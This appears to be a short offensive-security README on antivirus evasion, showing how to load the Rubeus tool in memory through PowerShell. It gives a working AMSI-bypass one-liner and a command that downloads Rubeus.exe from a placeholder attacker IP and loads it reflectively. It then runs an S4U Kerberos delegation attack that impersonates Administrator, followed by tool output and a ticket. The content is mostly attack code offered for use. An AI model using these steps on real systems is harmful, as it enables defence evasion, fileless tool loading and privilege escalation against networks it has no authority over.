# AV-Bypass-Techniques
Various AV bypass techniques.

## PowerShell AV Bypass Techniques

### Load .exe in Memory

Once we have compiled a program, say Rubeus, we can load it and execute it from memory. The below steps detail this technique:

  1. Bypass AMSI:
     ```
     PS > $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
     ```
  2. Download binary and store it into a variable:
     ```
     PS > $data = (New-Object System.Net.WebClient).DownloadData('http://<IP ADDRESS>/Rubeus.exe')
     ```
  3. Load the binary as an assembly:
     ```
     PS > $assem = [System.Reflection.Assembly]::Load($data)
     ```
To interact with the assembly, we take advantage of the fact that the *Main* method is public and we can invoke all of its funcionality by specifying the function name.

```
PS > [Rubeus.Program]::Main("s4u /user:sunflower$ /rc4:9C7E20D38DF38F2A09212D159872E809 /impersonateuser:Administrator /msdsspn:cifs/sql02.evil.corp /ptt".Split())

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: 9C7E20D38DF38F2A09212D159872E809
[*] Building AS-REQ (w/ preauth) for: 'evil.corp\sql02$'
[*] Using domain controller: 10.10.10.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIEpjCCBKKgAwIBBaEDAgEWooIDyTCCA8VhggPBMIIDvaADAgEFoQobCEVWSUwuQ09Noh0wG6ADAgEC
<SNIP>
```
